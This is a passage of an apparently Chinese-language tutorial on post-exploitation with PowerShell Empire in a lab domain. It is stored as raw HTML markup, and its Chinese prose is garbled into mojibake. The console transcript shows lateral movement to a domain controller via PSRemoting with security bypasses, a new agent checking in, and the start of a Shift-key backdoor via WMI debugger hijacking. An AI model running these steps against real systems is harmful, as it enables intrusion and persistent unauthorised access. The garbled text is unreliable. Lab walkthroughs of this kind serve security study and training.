&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7VLBMT3A to run Task &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/lateral_movement/invoke_psremoting
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to 7VLBMT3A
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @harmj0y                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Executes a stager on remote hosts using PSRemoting. 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                          
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/lateral_movement/invoke_psremoting       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1028            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name             â”‚ Value              â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent            â”‚ 7VLBMT3A           â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Bypasses         â”‚ mattifestation etw â”‚ False    â”‚ Bypasses as a space separated list  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ to be prepended to the launcher.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Command          â”‚                    â”‚ False    â”‚ Custom &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to execute on remote â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ hosts.                              â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ComputerName     â”‚                    â”‚ True     â”‚ Host&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to execute the stager on,   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ comma separated.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ CredID           â”‚                    â”‚ False    â”‚ CredID from the store to use.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Listener         â”‚                    â”‚ False    â”‚ Listener to use.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Obfuscate        â”‚ False              â”‚ False    â”‚ Switch. Obfuscate the launcher      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ powershell code, uses the           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ ObfuscateCommand &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; obfuscation    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ types. For powershell only.         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ObfuscateCommand â”‚ Token&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ll&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt;        â”‚ False    â”‚ The Invoke-Obfuscation &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ use. Only used &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; Obfuscate switch  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ is True. For powershell only.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Password         â”‚                    â”‚ False    â”‚ Password to use to execute command. â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Proxy            â”‚ default            â”‚ False    â”‚ Proxy to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ none, or other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProxyCreds       â”‚ default            â”‚ False    â”‚ Proxy credentials                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username:password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserAgent        â”‚ default            â”‚ False    â”‚ User-agent string to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ staging request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserName         â”‚                    â”‚ False    â”‚ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username to use to execute â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ command.                            â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_psremoting&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; ComputerName dc.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set ComputerName to dc.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_psremoting&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Listener to &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_psremoting&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7VLBMT3A to run Task &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: SW2P75
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; New agent KX4GRYNF checked in
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending agent &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;stage 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to KX4GRYNF at 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; back
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: agents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°å·²ç»åå¼¹æˆåŠŸï¼Œå’ŒWMIçš„æ¨¡å—åå¼¹å›æ¥çš„æƒé™ä¸€æ ·çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//18.png&#34; alt=&#34;18&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;åé—¨&#34;&gt;åé—¨&lt;/h2&gt;
&lt;p&gt;åé—¨å°±æ— éœ€å¤šè¯´äº†ï¼Œå¤§å®¶éƒ½æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œå°±æ˜¯ä¸éœ€è¦é€šè¿‡å¯†ç å‡­è¯è¿›å…¥å’Œæ§åˆ¶ç³»ç»Ÿï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šç”¨åŠ«æŒShiftã€æ³¨å†Œè¡¨ã€è®¡åˆ’ä»»åŠ¡ç­‰æ–¹å¼è¿›è¡Œæ”¾ç½®åé—¨ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åŠ«æŒshiftåé—¨&#34;&gt;åŠ«æŒShiftåé—¨&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨æ¨¡å—&lt;code&gt;invoke_wmi_debugger&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7VLBMT3A to run Task &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/lateral_movement/invoke_wmi_debugger
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to 7VLBMT3A
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @harmj0y                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   False                                                                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Uses WMI to &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; the debugger &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; a target binary on a remote machine 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              to be cmd.exe or a stager.                                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/lateral_movement/invoke_wmi_debugger                      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    False                                                                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1047                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
